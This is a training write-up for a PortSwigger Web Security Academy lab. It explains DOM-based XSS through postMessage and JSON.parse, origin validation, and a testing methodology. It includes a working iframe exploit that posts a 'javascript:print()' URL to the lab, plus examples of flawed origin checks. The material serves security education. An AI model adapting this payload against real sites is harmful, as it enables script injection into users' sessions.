# Lab 03 — DOM XSS Using Web Messages and JSON.parse()

## 1. Lab Overview

This lab demonstrates a DOM-based XSS vulnerability involving:

```text
postMessage()
JSON.parse()
Web Message Event
JavaScript Object
iframe src Attribute
javascript: URL
```

The key vulnerability is that the application accepts a web message, parses it as JSON, and uses a value from the parsed object in a security-sensitive DOM operation.

The lab objective is to:

```text
Construct an HTML page on the exploit server
        ↓
Send a malicious Web Message
        ↓
Trigger the vulnerable JavaScript
        ↓
Execute print()
```

The supplied lab notes identify this as the PortSwigger lab **"DOM XSS using web messages and JSON.parse"**. :contentReference[oaicite:1]{index=1}

---

# 2. Core Concept

The vulnerability follows this data flow:

```text
Attacker-Controlled Page
        ↓
postMessage()
        ↓
message event
        ↓
event.data
        ↓
JSON.parse()
        ↓
Parsed Object
        ↓
url Property
        ↓
iframe src
        ↓
javascript: URL
        ↓
JavaScript Execution
```

The important mental model is:

```text
SOURCE
  ↓
PROPAGATION
  ↓
SINK
  ↓
EXECUTION
```

---

# 3. What Is `postMessage()`?

Web pages can communicate with other windows or frames using:

```javascript
postMessage()
```

A simplified example is:

```javascript
targetWindow.postMessage(message, targetOrigin);
```

The receiving page can listen for the message:

```javascript
window.addEventListener('message', function(event) {
    // process event.data
});
```

The message data is available through:

```javascript
event.data
```

The provided source material identifies Web Messages as a potential attacker-controlled source when the receiving application does not properly verify the sender. :contentReference[oaicite:2]{index=2}

---

# 4. Why Web Messages Can Become Vulnerable

A Web Message by itself is not necessarily dangerous.

The security problem occurs when:

```text
Untrusted Sender
       ↓
Web Message
       ↓
event.data
       ↓
Unsafe Processing
       ↓
Dangerous Sink
```

For example:

```javascript
window.addEventListener('message', function(event) {
    someElement.innerHTML = event.data;
});
```

Here:

```text
event.data
```

is attacker-controlled.

If it reaches a dangerous sink, the application may become vulnerable.

---

# 5. Lab Objective

The lab requires you to:

```text
Create an exploit page
        ↓
Embed the vulnerable application
        ↓
Send a Web Message
        ↓
Trigger the vulnerable message handler
        ↓
Cause print()
```

The supplied notes explicitly state that the exploit should call:

```javascript
print()
```

rather than relying on an alert. :contentReference[oaicite:3]{index=3}

---

# 6. Step 1 — Inspect the Home Page

Open the lab.

Inspect the JavaScript associated with the home page.

Look for:

```javascript
window.addEventListener('message', ...)
```

or:

```javascript
addEventListener('message', ...)
```

The important observation is that the page contains an event listener that receives Web Messages. :contentReference[oaicite:4]{index=4}

---

# 7. Step 2 — Identify `event.data`

Inside the message event handler, determine how the incoming message is processed.

The lab expects the message to be a string.

The JavaScript passes the message through:

```javascript
JSON.parse()
```

Conceptually:

```javascript
const data = JSON.parse(event.data);
```

Therefore:

```text
event.data
      ↓
JSON.parse()
      ↓
JavaScript Object
```

---

# 8. Step 3 — Understand the JSON Object

The event handler expects a:

```text
type
```

property.

The relevant operation is the:

```text
load-channel
```

case.

The source material states that the JavaScript expects a `type` property and that the `load-channel` case changes the iframe source. :contentReference[oaicite:5]{index=5}

Conceptually:

```json
{
    "type": "load-channel",
    "url": "..."
}
```

---

# 9. Step 4 — Identify the Sink

The important property is:

```text
url
```

The `load-channel` case takes the URL supplied in the message and assigns it to the source of an iframe.

Conceptually:

```javascript
iframe.src = data.url;
```

Therefore:

```text
event.data
      ↓
JSON.parse()
      ↓
data.url
      ↓
iframe.src
```

The supplied lab notes describe this exact flow. :contentReference[oaicite:6]{index=6}

---

# 10. Step 5 — Understand the Dangerous Value

Instead of supplying a normal URL:

```text
https://example.com
```

the lab uses a JavaScript URL:

```text
javascript:print()
```

The important concept is:

```text
URL-Controlled Sink
        ↓
javascript: URL
        ↓
JavaScript Execution
```

---

# 11. Step 6 — Check Origin Validation

Inspect the message listener for origin validation.

A secure implementation should verify:

```javascript
event.origin
```

against a trusted origin.

In this lab, the handler does not perform an effective origin check.

The exploit therefore uses:

```text
*
```

as the target origin when sending the message.

The supplied notes specifically state that the second argument allows any target origin and that the event handler does not perform an origin check. :contentReference[oaicite:7]{index=7}

---

# 12. Step 7 — Build the Exploit

Go to the:

```text
Exploit Server
```

Create an HTML page containing an iframe.

Use:

```html
<iframe
    src="https://YOUR-LAB-ID.web-security-academy.net/"
    onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
</iframe>
```

Replace:

```text
YOUR-LAB-ID
```

with your actual lab identifier.

This is the exploit structure documented in your source material. :contentReference[oaicite:8]{index=8}

---

# 13. Why the iframe Is Used

The iframe gives the exploit page access to the vulnerable page's window.

Conceptually:

```text
Exploit Server
      ↓
<iframe>
      ↓
Vulnerable Application
      ↓
contentWindow
      ↓
postMessage()
```

The exploit page can therefore send a message directly to the vulnerable frame.

---

# 14. Understanding `contentWindow`

The iframe exposes its window through:

```javascript
iframe.contentWindow
```

Therefore:

```javascript
this.contentWindow.postMessage(...)
```

means:

```text
Send message to the window loaded inside the iframe
```

---

# 15. Understanding the Message

The message sent by the exploit is:

```json
{
    "type": "load-channel",
    "url": "javascript:print()"
}
```

The JavaScript representation requires escaping the quotes:

```javascript
"{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}"
```

---

# 16. Complete Taint Flow

```text
Exploit Server
      ↓
iframe
      ↓
contentWindow.postMessage()
      ↓
Web Message
      ↓
event.data
      ↓
JSON.parse()
      ↓
Parsed Object
      ↓
type = "load-channel"
      ↓
url property
      ↓
iframe.src
      ↓
javascript:print()
      ↓
print()
```

---

# 17. Step 8 — Store the Exploit

On the exploit server:

```text
1. Enter the HTML.
2. Store the exploit.
3. Confirm the exploit is saved.
4. Deliver it to the victim.
```

The supplied lab notes instruct you to store the exploit and deliver it to the victim. :contentReference[oaicite:9]{index=9}

---

# 18. What Happens When the Exploit Loads?

The sequence is:

```text
Exploit Page Loads
        ↓
iframe Loads Vulnerable Page
        ↓
iframe onload Fires
        ↓
postMessage()
        ↓
Vulnerable Page Receives Message
        ↓
JSON.parse()
        ↓
type = load-channel
        ↓
url Property Selected
        ↓
iframe src Updated
        ↓
javascript:print()
        ↓
print()
```

The supplied material confirms that the `load-channel` case assigns the message's URL value to the iframe source, resulting in execution of `print()`. :contentReference[oaicite:10]{index=10}

---

# 19. Source → Sink Analysis

## Source

```text
event.data
```

The attacker controls the message.

---

## Processing

```text
JSON.parse()
```

The string is converted into a JavaScript object.

---

## Propagation

```text
data.type
data.url
```

The application selects the appropriate operation based on:

```text
type
```

and obtains the attacker-controlled:

```text
url
```

---

## Sink

```text
iframe.src
```

The URL is assigned to the iframe.

---

## Execution

```text
javascript:print()
```

The browser processes the JavaScript URL.

---

# 20. Why `JSON.parse()` Matters

`JSON.parse()` itself is not the vulnerability.

For example:

```javascript
JSON.parse('{"name":"test"}');
```

is normal.

The security problem is:

```text
Attacker-Controlled JSON
        ↓
JSON.parse()
        ↓
Application Trusts Parsed Properties
        ↓
Dangerous Sink
```

Therefore:

```text
JSON.parse() ≠ Vulnerability
```

The vulnerability depends on how the parsed values are subsequently used.

---

# 21. Why `type` Matters

The application expects a specific command:

```text
load-channel
```

This determines which branch of the JavaScript executes.

Conceptually:

```javascript
switch(data.type) {

    case "load-channel":
        iframe.src = data.url;
        break;

}
```

The attacker therefore needs to supply the expected type.

---

# 22. Why `url` Matters

The attacker controls:

```text
url
```

The application uses it as a navigation/resource-loading destination.

Therefore:

```text
Attacker-Controlled URL
        ↓
iframe.src
```

becomes the critical source-to-sink path.

---

# 23. Why Missing Origin Validation Matters

A secure Web Message handler should establish:

```text
Who sent the message?
```

using:

```javascript
event.origin
```

The vulnerable application fails to perform adequate origin verification.

Therefore:

```text
Attacker Origin
      ↓
postMessage()
      ↓
Vulnerable Listener
      ↓
Trusted Processing
```

The message is accepted despite coming from an untrusted source.

---

# 24. `targetOrigin` vs `event.origin`

These are different concepts.

## `targetOrigin`

Used by the sender:

```javascript
postMessage(message, targetOrigin)
```

It specifies where the message is intended to be delivered.

---

## `event.origin`

Used by the receiver:

```javascript
event.origin
```

It identifies the origin of the window that sent the message.

---

## Security Principle

The receiver should independently verify:

```javascript
event.origin
```

Do not assume that because the sender used a particular target origin, the received data is trustworthy.

---

# 25. Common Weak Origin Validation

The supplied material also demonstrates flawed origin checks.

Example:

```javascript
if (e.origin.indexOf('normal-website.com') > -1) {
    eval(e.data);
}
```

This checks whether the trusted string appears anywhere in the origin.

An attacker-controlled origin such as:

```text
http://www.normal-website.com.evil.net
```

could satisfy the check. :contentReference[oaicite:11]{index=11}

---

# 26. Another Weak Validation Pattern

A similar problem can occur with:

```javascript
e.origin.endsWith('normal-website.com')
```

The source material shows that an origin such as:

```text
http://www.malicious-websitenormal-website.com
```

could satisfy a naive suffix check. :contentReference[oaicite:12]{index=12}

---

# 27. Why Substring Checks Are Dangerous

Avoid thinking:

```text
Contains trusted domain
        =
Trusted origin
```

They are not equivalent.

The important security property is:

```text
Exact Expected Origin
```

rather than:

```text
Partial String Match
```

---

# 28. Web Message Testing Methodology

Use this workflow when you encounter:

```javascript
postMessage()
```

or:

```javascript
addEventListener('message', ...)
```

```text
START
  ↓
Find Message Listener
  ↓
Identify event.data
  ↓
Check Origin Validation
  ↓
Determine Message Format
  ↓
Check JSON.parse()
  ↓
Identify Expected Properties
  ↓
Trace Properties
  ↓
Find Sink
  ↓
Determine Attacker Control
  ↓
Construct Controlled Message
  ↓
Confirm Impact
```

---

# 29. Step 1 — Find the Message Listener

Search JavaScript for:

```text
addEventListener('message'
```

Also search:

```text
onmessage
postMessage
message
event.data
```

---

# 30. Step 2 — Identify the Message Format

Determine whether the application expects:

```text
String
JSON
Object
Array
URL
Command
```

For this lab:

```text
event.data
      ↓
JSON.parse()
```

means the application expects JSON encoded as a string.

---

# 31. Step 3 — Identify Expected Properties

Look for:

```text
type
action
command
url
src
redirect
target
```

In this lab:

```text
type
url
```

are important.

---

# 32. Step 4 — Identify Branching Logic

Search for:

```text
switch()
if()
else if()
```

For example:

```javascript
switch(data.type) {
    case "load-channel":
        ...
}
```

Determine which value triggers a security-sensitive branch.

---

# 33. Step 5 — Trace the Property

Once you identify:

```text
data.url
```

follow it through the application.

Example:

```text
event.data
      ↓
JSON.parse()
      ↓
data
      ↓
data.url
      ↓
iframe.src
```

---

# 34. Step 6 — Identify the Sink

Common Web Message sinks may include:

```text
innerHTML
outerHTML
document.write()
location
location.href
location.assign()
location.replace()
iframe.src
script.src
eval()
Function()
setTimeout()
```

The specific lab uses an iframe source assignment.

---

# 35. Step 7 — Check Origin Validation

Look for:

```javascript
event.origin
```

Determine whether the application performs:

```text
Exact origin validation
```

or weak validation such as:

```text
indexOf()
includes()
startsWith()
endsWith()
```

---

# 36. Step 8 — Determine Attacker Control

Ask:

```text
Can I create the sending window?
Can I host an iframe?
Can I call postMessage()?
Can I control event.data?
Can I control the relevant JSON property?
```

If the answer is yes, continue tracing the data.

---

# 37. Burp Suite Workflow

```text
Burp Suite
      ↓
Burp Browser
      ↓
Open Lab
      ↓
HTTP History
      ↓
Inspect HTML
      ↓
Inspect JavaScript
      ↓
Search for message listeners
      ↓
Identify event.data
      ↓
Trace JSON.parse()
      ↓
Find message properties
      ↓
Find sink
      ↓
Construct exploit
```

---

# 38. DevTools Workflow

Use:

```text
DevTools
    ↓
Sources
    ↓
Ctrl + Shift + F
    ↓
Search:
    message
    postMessage
    event.data
    JSON.parse
```

Set a breakpoint inside:

```javascript
addEventListener('message', ...)
```

Then trigger the message.

Inspect:

```text
event.origin
event.data
parsed object
type
url
sink value
```

---

# 39. DOM Invader

DOM Invader can assist with identifying:

```text
Web Message Sources
DOM Sinks
Taint Flow
```

Your notes describe DOM Invader as a tool that automates taint tracking between sources and sinks and is particularly useful when JavaScript is minified or obfuscated. :contentReference[oaicite:13]{index=13}

Use it to support, rather than replace, manual source-to-sink analysis.

---

# 40. Common Mistakes

## Mistake 1 — Blaming `postMessage()`

```text
postMessage()
```

is not inherently vulnerable.

The issue is how the receiving page processes the message.

---

## Mistake 2 — Blaming `JSON.parse()`

```text
JSON.parse()
```

does not execute JavaScript by itself.

The vulnerability comes from unsafe use of the parsed data.

---

## Mistake 3 — Ignoring `event.origin`

Always inspect:

```javascript
event.origin
```

when analyzing Web Message vulnerabilities.

---

## Mistake 4 — Stopping at the Message Handler

Finding:

```javascript
event.data
```

is only the beginning.

Trace:

```text
event.data
      ↓
processing
      ↓
property
      ↓
sink
```

---

## Mistake 5 — Ignoring Branch Conditions

If the code uses:

```javascript
switch(data.type)
```

you need to understand which branch handles attacker-controlled data.

---

# 41. Lab Write-Up Template

Use this structure for your final notes:

```markdown
# Lab 03 — DOM XSS Using Web Messages and JSON.parse()

## Objective

Construct an exploit on the exploit server that causes print() to execute.

## Source

```text
event.data
```

## Processing

```text
JSON.parse()
```

## Important Properties

```text
type
url
```

## Sink

```text
iframe.src
```

## Origin Validation

```text
No effective origin validation
```

## Taint Flow

```text
Exploit Server
      ↓
iframe
      ↓
postMessage()
      ↓
event.data
      ↓
JSON.parse()
      ↓
data.type
      ↓
data.url
      ↓
iframe.src
      ↓
javascript:print()
      ↓
print()
```

## Exploit

```html
<iframe
src="https://YOUR-LAB-ID.web-security-academy.net/"
onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
</iframe>
```

## Result

The vulnerable message handler processes the attacker-controlled JSON and assigns the supplied JavaScript URL to the iframe source, causing `print()` to execute.

## Key Lesson

Always trace Web Message data from `event.data` through parsing and application logic to the final sink, and verify that the sender's origin is properly validated.
```

---

# 42. Quick Revision

## Source

```text
event.data
```

## Transport

```text
postMessage()
```

## Parsing

```text
JSON.parse()
```

## Important Property

```text
url
```

## Sink

```text
iframe.src
```

## Dangerous Value

```text
javascript:print()
```

## Missing Security Control

```text
Proper event.origin validation
```

---

# 43. One-Line Taint Flow

```text
postMessage() → event.data → JSON.parse() → data.url → iframe.src → javascript:print()
```

---

# 44. Web Message Checklist

```text
☐ Find message listener
☐ Identify event.data
☐ Check event.origin
☐ Check targetOrigin
☐ Determine message format
☐ Check JSON.parse()
☐ Identify expected properties
☐ Identify switch/branch logic
☐ Trace attacker-controlled property
☐ Identify sink
☐ Determine whether sink is security-sensitive
☐ Test controlled input
☐ Confirm impact
☐ Document source → propagation → sink
```

---

# 45. Final Mental Model

```text
                 ATTACKER
                    ↓
             EXPLOIT SERVER
                    ↓
                  iframe
                    ↓
              postMessage()
                    ↓
             MESSAGE EVENT
                    ↓
                event.data
                    ↓
               JSON.parse()
                    ↓
              Parsed Object
                    ↓
              data.type
                    ↓
             load-channel
                    ↓
               data.url
                    ↓
               iframe.src
                    ↓
          javascript:print()
                    ↓
                  print()
```

---

# 46. Final Rule

```text
UNTRUSTED WEB MESSAGE
        +
WEAK / MISSING ORIGIN VALIDATION
        +
UNSAFE MESSAGE PROCESSING
        +
ATTACKER-CONTROLLED PROPERTY
        +
DANGEROUS SINK
        =
DOM-BASED WEB MESSAGE VULNERABILITY
```